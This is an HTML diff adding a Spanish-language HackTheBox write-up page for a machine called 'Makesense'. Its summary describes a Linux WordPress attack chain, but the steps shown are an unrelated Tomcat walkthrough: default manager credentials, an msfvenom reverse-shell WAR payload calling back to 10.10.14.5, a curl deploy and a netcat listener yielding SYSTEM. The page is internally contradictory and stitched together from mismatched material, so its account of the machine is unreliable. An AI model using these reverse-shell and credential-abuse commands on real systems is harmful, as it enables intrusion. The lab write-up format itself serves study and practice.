@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+<title>Writeup - HackTheBox - Makesense</title>
+  
+<meta name="theme-color" content="#0a0a0a">
+  
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Rajdhani:wght@400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../css/style.css">
+<link rel="icon" type="image/png" href="../images/favicon.png">
+
+<link rel="apple-touch-icon" href="../images/favicon.png">
+  
+</head>
+
+  <style>
+    :root {
+      --purple-deep:   #0d0010;
+      --purple-dark:   #1a0025;
+      --purple-mid:    #3d0060;
+      --purple-glow:   #8b00cc;
+      --purple-bright: #b44aff;
+      --orange-hot:    #ff5e00;
+      --orange-glow:   #ff8c00;
+      --red-ember:     #cc1a00;
+      --pink-neon:     #ff2d78;
+      --text-primary:  #f0e8ff;
+      --text-dim:      #9b7fc0;
+      --text-muted:    #5a4070;
+      --border-glow:   rgba(180, 74, 255, 0.3);
+    }
+
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      background: var(--purple-deep);
+      color: var(--text-primary);
+      font-family: 'Outfit', sans-serif;
+      font-weight: 300;
+      overflow-x: hidden;
+      padding-top: 80px;
+    }
+
+    /* FONDO ANIMADO */
+    .bg-orbs {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 0;
+      overflow: hidden;
+    }
+
+    .orb {
+      position: absolute;
+      border-radius: 50%;
+      filter: blur(80px);
+      opacity: 0.12;
+      animation: drift 20s ease-in-out infinite;
+    }
+
+    .orb-1 {
+      width: 600px;
+      height: 600px;
+      background: var(--purple-glow);
+      top: -200px;
+      right: -100px;
+      animation-delay: 0s;
+    }
+
+    .orb-2 {
+      width: 400px;
+      height: 400px;
+      background: var(--orange-hot);
+      bottom: 10%;
+      left: -100px;
+      animation-delay: -7s;
+    }
+
+    .orb-3 {
+      width: 300px;
+      height: 300px;
+      background: var(--pink-neon);
+      top: 50%;
+      right: 20%;
+      animation-delay: -14s;
+    }
+
+    @keyframes drift {
+      0%, 100% { transform: translate(0, 0) scale(1); }
+      33% { transform: translate(30px, -40px) scale(1.05); }
+      66% { transform: translate(-20px, 30px) scale(0.95); }
+    }
+
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      position: relative;
+      z-index: 1;
+      padding: 2rem;
+    }
+
+    /* HEADER */
+    .header {
+      margin-bottom: 3rem;
+      padding-bottom: 0,5rem;
+    }
+
+    .header-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+    }
+
+    .label {
+      font-family: 'Space Mono', monospace;
+      font-size: 0.65rem;
+      letter-spacing: 3px;
+      color: var(--purple-bright);
+      text-transform: uppercase;
+      margin-bottom: 0.8rem;
+    }
+    .label::before { content: '[ '; }
+    .label::after { content: ' ]'; }
+
+    h1 {
+      font-family: 'Rajdhani', sans-serif;
+      font-size: clamp(2.5rem, 6vw, 4rem);
+      font-weight: 700;
+      margin: 0.5rem 0 0;
+      background: linear-gradient(90deg, var(--purple-bright), var(--orange-hot));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      letter-spacing: -1px;
+    }
+
+    .subheader {
+      font-family: 'Space Mono', monospace;
+      color: var(--text-dim);
+      font-size: 0.8rem;
+      margin-top: 0.5rem;
+      letter-spacing: 1px;
+    }
+    
+
+    .card-diff{
+      padding: 8px 16px;
+      font-size: 0.7rem;
+      font-weight: 600;
+      letter-spacing: 2px;
+
+    }
+
+
+    .difficulty {
+      font-family: 'Space Mono', monospace;
+      background: linear-gradient(135deg, var(--purple-glow), var(--purple-bright));
+      color: white;
+      padding: 8px 16px;
+      font-size: 0.7rem;
+      font-weight: 600;
+      white-space: nowrap;
+      clip-path: polygon(6px 0%, 100% 0%, calc(100% - 6px) 100%, 0% 100%);
+      letter-spacing: 2px;
+      text-transform: uppercase;
+    }
+
+    /* RESUMEN */
+    .resumen-section {
+      margin-bottom: 3rem;
+    }
+
+    .section-title {
+      font-family: 'Rajdhani', sans-serif;
+      font-size: clamp(1.8rem, 3vw, 2.5rem);
+      font-weight: 700;
+      margin-bottom: 1.5rem;
+      padding-bottom: 1rem;
+      border-bottom: 1px solid var(--border-glow);
+      position: relative;
+      display: inline-block;
+      color: var(--text-primary);
+    }
+
+    .section-title::after {
+      content: '';
+      position: absolute;
+      bottom: -1px;
+      left: 0;
+      width: 100%;
+      height: 1px;
+      background: linear-gradient(90deg, var(--purple-bright), var(--orange-hot));
+    }
+
+    .resumen-text {
+      color: var(--text-dim);
+      font-size: 1rem;
+      line-height: 1.9;
+      margin-bottom: 2rem;
+    }
+
+    /* STEPS CONTAINER */
+    .steps-container {
+      display: flex;
+      flex-direction: column;
+      gap: 0;
+      position: relative;
+      padding-left: 100px;
+    }
+
+    .steps-container::before {
+      content: '';
+      position: absolute;
+      left: 49px;
+      top: 60px;
+      bottom: 0;
+      width: 2px;
+      background: linear-gradient(180deg,
+        var(--purple-bright) 0%,
+        var(--purple-bright) 25%,
+        var(--pink-neon) 25%,
+        var(--pink-neon) 50%,
+        var(--orange-hot) 50%,
+        var(--orange-hot) 75%,
+        #00c850 75%,
+        #00c850 100%
+      );
+      z-index: 0;
+    }
+
+    .step-card {
+      position: relative;
+      z-index: 1;
+      margin-bottom: 2.5rem;
+    }
+
+    .step-header {
+      display: flex;
+      align-items: flex-start;
+      gap: 1.5rem;
+      cursor: pointer;
+      user-select: none;
+      position: relative;
+    }
+
+    .step-icon {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 48px;
+      flex-shrink: 0;
+      background: linear-gradient(135deg, rgba(61,0,96,0.6), rgba(139,0,204,0.4));
+      border: 3px solid var(--purple-bright);
+      position: relative;
+      margin-left: -100px;
+      box-shadow: 0 0 30px rgba(180, 74, 255, 0.3);
+      transition: all 0.3s;
+    }
+
+    .step-card.reconocimiento .step-icon {
+      border-color: var(--purple-bright);
+      background: linear-gradient(135deg, rgba(255, 0, 242, 0.2), rgba(255,140,0,0.15));
+      box-shadow: 0 0 30px rgba(140, 0, 255, 0.326);
+    }
+
+    .step-card.enumeracion .step-icon {
+      border-color: var(--pink-neon);
+      background: linear-gradient(135deg, rgba(191, 0, 255, 0.2), rgba(255,140,0,0.15));
+      box-shadow: 0 0 30px rgba(247, 0, 255, 0.3);
+    }
+
+    .step-card.explotacion .step-icon {
+      border-color: var(--orange-hot);
+      background: linear-gradient(135deg, rgba(255,94,0,0.2), rgba(255,140,0,0.15));
+      box-shadow: 0 0 30px rgba(255, 94, 0, 0.3);
+    }
+
+    .step-card.escalada .step-icon {
+      border-color: #00c850;
+      background: linear-gradient(135deg, rgba(0,200,80,0.2), rgba(0,200,80,0.1));
+      box-shadow: 0 0 30px rgba(0, 200, 80, 0.3);
+    }
+
+    .step-header:hover .step-icon {
+      transform: scale(1.1) translateY(-5px);
+    }
+
+    .step-info {
+      flex: 1;
+      padding-top: 1.5rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+    }
+
+    .step-texts {
+      flex: 1;
+    }
+
+    .step-title {
+      font-family: 'Rajdhani', sans-serif;
+      font-weight: 600;
+      font-size: 1.3rem;
+      margin-bottom: 0.3rem;
+      color: var(--purple-bright);
+    }
+
+    .step-card.reconocimiento .step-title {
+      color: var(--purple-bright);
+    }
+
+    .step-card.enumeracion .step-title {
+      color: var(--pink-neon);
+    }
+
+    .step-card.explotacion .step-title {
+      color: var(--orange-hot);
+    }
+
+    .step-card.escalada .step-title {
+      color: #00c850;
+    }
+
+    .step-description {
+      font-family: 'Space Mono', monospace;
+      color: var(--text-muted);
+      font-size: 0.8rem;
+      letter-spacing: 0.5px;
+    }
+
+    .step-arrow {
+      font-family: 'Rajdhani', sans-serif;
+      font-size: 1.5rem;
+      color: var(--purple-bright);
+      padding-top: 0.5rem;
+      transition: transform 0.3s;
+    }
+
+    .step-card.reconocimiento .step-arrow {
+      color: var(--purple-bright);
+    }
+
+    .step-card.enumeracion .step-arrow {
+      color: var(--pink-neon);
+    }
+
+    .step-card.explotacion .step-arrow {
+      color: var(--orange-hot);
+    }
+
+    .step-card.escalada .step-arrow {
+      color: #00c850;
+    }
+
+    .step-card.expanded .step-arrow {
+      transform: rotate(90deg);
+    }
+
+    /* CONTENIDO */
+    .step-content {
+      max-height: 0;
+      overflow: hidden;
+      transition: all 0.3s ease;
+      margin-top: 0;
+    }
+
+    .step-card.expanded .step-content {
+      max-height: 2000px;
+      margin-top: 1.5rem;
+    }
+
+    .content-box {
+      background: rgba(26,0,37,0.8);
+      border: 1px solid var(--border-glow);
+      border-left: 4px solid var(--purple-bright);
+      border-radius: 0;
+      padding: 1.5rem;
+    }
+
+    .step-card.reconocimiento .content-box {
+      border-left-color: var(--purple-bright);
+    }
+
+    .step-card.enumeracion .content-box {
+      border-left-color: var(--pink-neon);
+    }
+
+    .step-card.explotacion .content-box {
+      border-left-color: var(--orange-hot);
+    }
+
+    .step-card.escalada .content-box {
+      border-left-color: #00c850;
+    }
+
+    .code-block {
+      background: var(--purple-dark);
+      border: 1px solid rgba(180, 74, 255, 0.2);
+      padding: 1.2rem;
+      border-radius: 0;
+      margin-bottom: 1rem;
+      font-family: 'Space Mono', monospace;
+      font-size: 0.85rem;
+      color: #00ff99;
+      line-height: 1.7;
+      overflow-x: auto;
+      clip-path: polygon(4px 0%, 100% 0%, 100% calc(100% - 4px), calc(100% - 4px) 100%, 0% 100%, 0 4px);
+    }
+
+    .code-block .comment {
+      color: var(--text-muted);
+    }
+
+    .step-text {
+      color: var(--text-dim);
+      font-size: 0.95rem;
+      line-height: 1.8;
+    }
+
+    .step-text strong {
+      color: var(--pink-neon);
+      font-weight: 500;
+    }
+
+    .step-card.reconocimiento .step-text strong {
+      color: var(--purple-bright);
+    }
+
+    .step-card.enumeracion .step-text strong {
+      color: var(--pink-neon);
+    }
+
+    .step-card.explotacion .step-text strong {
+      color: var(--orange-hot);
+    }
+
+    .step-card.escalada .step-text strong {
+      color: #00c850;
+    }
+
+    .step-text ul {
+      margin: 0.8rem 0;
+      padding-left: 1.5rem;
+      color: var(--text-dim);
+    }
+
+    .step-text ul li {
+      margin-bottom: 0.4rem;
+    }
+
+    /* UTILIDADES */
+    .divider {
+      width: 100%;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, var(--border-glow), transparent);
+      margin: 2rem 0;
+    }
+
+    /* RESPONSIVE */
+    @media (max-width: 768px) {
+      .container {
+        padding: 1rem;
+      }
+
+      .header-top {
+        flex-direction: column;
+        gap: 1rem;
+      }
+
+      .steps-container {
+        padding-left: 60px;
+      }
+
+      .step-icon {
+        width: 70px;
+        height: 70px;
+        font-size: 32px;
+        margin-left: -70px;
+      }
+
+      .step-info {
+        flex-direction: column;
+      }
+
+      .step-arrow {
+        margin-top: 0.5rem;
+      }
+    }
+  </style>
+</head>
+<body>
+    
+<div class="cursor" id="cursor"></div>
+<div class="cursor-trail" id="cursorTrail"></div>
+
+  <!-- FONDO -->
+  <div class="bg-orbs">
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+    <div class="orb orb-3"></div>
+  </div>
+
+  <!-- NAV -->
+  <nav>
+    <div class="nav-logo">YZ//0TRUST</div>
+    <ul class="nav-links">
+      <a href="../#about">Sobre mí</a>
+      <a href="../#writeups">Writeups</a>
+      <a href="../#tools">Arsenal</a>
+      <a href="../#certs">Certs</a>
+      <a href="../#Labs">Labs & Platforms</a>
+      <li><a href="#contact">Contacto</a></li>
+    </ul>
+</nav>
+
+<!-- CONTENEDOR WRITEUP -->
+  <div class="container">
+    
+    <!-- HEADER -->
+    <div class="header">
+      <div class="header-top">
+        <div class="machine-name">
+          <div class="label">Máquina</div>
+          <h1 id="machineTitle">Makesense</h1>
+          <div class="subheader" id="machineSubheader">Windows • Apache Tomcat 7.0.88</div>
+        </div>
+        <div class="card-diff diff-medium" id="machineDifficulty">MEDIUM</div>
+      </div>
+    </div>
+    
+<div class="divider"></div>
+
+    <!-- RESUMEN TÉCNICO -->
+    <div class="resumen-section">
+      <h2 class="section-title">Resumen Técnico</h2>
+      <div class="resumen-text" id="resumenText">
+        Ingresa el resumen técnico de la máquina aquí.
+      </div>
+    </div>
+
+<div class="divider"></div>
+
+    <!-- STEPS -->
+    <div class="steps-container" id="stepsContainer">
+      <!-- Se generan automáticamente -->
+    </div>
+  </div>
+
+  <script>
+    // ==================== CONFIGURACIÓN ====================
+    // EDITAR ESTA SECCIÓN PARA CADA MÁQUINA
+
+    const CONFIG = {
+      machineTitle: "Makesense",
+      machineSubheader: "Linux • WordPress 7.0",
+      machineDifficulty: "MEDIUM",
+      resumenText: "MakeSense es una máquina Linux que utiliza WordPress 7.0 como servicio web. A partir de la enumeración de servicios y directorios, junto con el análisis de algunas funcionalidades de la aplicación web, se consigue obtener acceso remoto al sistema y posteriormente escalar privilegios hasta root. La cadena de explotación incluye una vulnerabilidad XSS, RCE mediante la subida de un plugin malicioso, conexión mediante SSH y SSH Port Forwarding para acceder a servicios internos. Posteriormente, mediante la reutilización de credenciales y el análisis del servicio OCR disponible a través de la funcionalidad Draw en localhost, se consigue explotar el servicio que se ejecuta como root y obtener una RCE con privilegios elevados.",
+      steps: [
+        {
+          number: "01",
+          title: "Reconocimiento",
+          description: "Escaneo inicial de puertos y servicios",
+          type: "reconocimiento",
+          icon: "🔍",
+          code: `$ nmap -p- --min-rate 5000 -sV jerry
+<span class="comment">Starting Nmap 7.92...</span>
+PORT STATE SERVICE VERSION
+80/tcp open http
+8080/tcp open http-proxy Tomcat 7.0.88`,
+          explanation: `<strong>Hallazgos:</strong> Dos puertos HTTP activos identificados. El puerto 8080 expone un servidor Tomcat. Se determina la versión y servicios disponibles.`
+        },
+        {
+          number: "02",
+          title: "Enumeración",
+          description: "Investigación detallada de servicios activos",
+          type: "enumeracion",
+          icon: "🧮",
+          code: `$ curl -u tomcat:s3cret http://jerry:8080/manager/html
+<span class="comment">→ Acceso al manager console exitoso</span>
+
+$ curl http://jerry:8080/
+<span class="comment">→ Versión identificada: Tomcat 7.0.88</span>`,
+          explanation: `<strong>Descubrimiento:</strong> El Tomcat Manager está habilitado con credenciales débiles (tomcat/s3cret) activas por defecto. Se identifica la capacidad de desplegar aplicaciones WAR.`
+        },
+        {
+          number: "03",
+          title: "Explotación",
+          description: "Acceso inicial mediante vulnerabilidades identificadas",
+          type: "explotacion",
+          icon: "💥",
+          code: `$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war
+
+$ curl -u tomcat:s3cret --upload-file shell.war http://jerry:8080/manager/text/deploy?path=/shell
+
+<span class="comment">→ Aplicación desplegada exitosamente</span>`,
+          explanation: `<strong>Estrategia:</strong> Se crea una aplicación WAR maliciosa con una reverse shell. Se despliega a través del Tomcat Manager utilizando las credenciales débiles. Se obtiene acceso inicial al sistema.`
+        },
+        {
+          number: "04",
+          title: "Escalada de Privilegios",
+          description: "Obtener acceso con máximos privilegios",
+          type: "escalada",
+          icon: "🚀",
+          code: `$ nc -lvnp 4444
+<span class="comment">Listening on [0.0.0.0] 4444</span>
+
+$ curl http://jerry:8080/shell/
+<span class="comment">JERRY\SYSTEM</span>`,
+          explanation: `<strong>Privilegios Elevados:</strong> La reverse shell se ejecuta con permisos SYSTEM. Se obtienen acceso total al sistema. Localizar flags en C:\\Users\\Administrator\\Desktop.`
+        }
+      ]
+    };
+
+    // ==================== FUNCIONES ====================
+
+    function initializeWriteup() {
+      document.getElementById('machineTitle').textContent = CONFIG.machineTitle;
+      document.getElementById('machineSubheader').textContent = CONFIG.machineSubheader;
+      document.getElementById('machineDifficulty').textContent = CONFIG.machineDifficulty;
+      document.getElementById('resumenText').textContent = CONFIG.resumenText;
+
+      const stepsContainer = document.getElementById('stepsContainer');
+      CONFIG.steps.forEach((step, idx) => {
+        const stepCard = createStepCard(step, idx);
+        stepsContainer.appendChild(stepCard);
+      });
+
+      loadStates();
+    }
+
+    function createStepCard(step, idx) {
+      const card = document.createElement('div');
+      card.className = `step-card ${step.type}`;
+      card.dataset.step = idx;
+
+      // Solo agregar clase adicional si no es reconocimiento
+      if (step.type !== 'reconocimiento') {
+        card.classList.add(step.type);
+      }
+
+      card.innerHTML = `
+        <div class="step-header">
+          <div class="step-icon">${step.icon}</div>
+          <div class="step-info">
+            <div class="step-texts">
+              <div class="step-title">${step.number}. ${step.title}</div>
+              <div class="step-description">${step.description}</div>
+            </div>
+            <div class="step-arrow">▶</div>
+          </div>
+        </div>
+        <div class="step-content">
+          <div class="content-box">
+            ${step.code ? `<div class="code-block">${step.code}</div>` : ''}
+            <div class="step-text">${step.explanation}</div>
+          </div>
+        </div>
+      `;
+
+      card.addEventListener('click', () => {
+        card.classList.toggle('expanded');
+        saveStates();
+      });
+
+      return card;
+    }
+
+    function saveStates() {
+      const steps = document.querySelectorAll('.step-card');
+      const states = {};
+      steps.forEach((step, idx) => {
+        states[idx] = step.classList.contains('expanded');
+      });
+      const key = `writeup-${CONFIG.machineTitle.toLowerCase()}-steps`;
+      localStorage.setItem(key, JSON.stringify(states));
+    }
+
+    function loadStates() {
+      const key = `writeup-${CONFIG.machineTitle.toLowerCase()}-steps`;
+      const saved = localStorage.getItem(key);
+      if (saved) {
+        const states = JSON.parse(saved);
+        const steps = document.querySelectorAll('.step-card');
+        steps.forEach((step, idx) => {
+          if (states[idx]) {
+            step.classList.add('expanded');
+          }
+        });
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', initializeWriteup);
+  </script>
+
+<div class="divider"></div>
+
+<!-- CONTACTO -->
+<section id="contact">
+    <div class="reveal">
+      <div class="social-links">
+
+      <a href="https://github.com/zbel-oss"
+         target="_blank"
+         class="social-link">
+         ⬡ GitHub
+      </a>
+      
+      <a href="https://www.linkedin.com/in/yelimarzambrano-"
+         target="_blank"
+         class="social-link">
+         in LinkedIn
+      </a>
+    </div>
+    </div>
+</section>
+
+<!-- FOOTER -->
+<footer>
+  <p>© 2026 Yelimar Zambrano · Junior Cybersecurity Analyst</p>
+  <p style="color:var(--purple-bright);">// hack the planet</p>
+</footer>
+
+<script src="../js/main.js"></script>
+</body>
+</html>
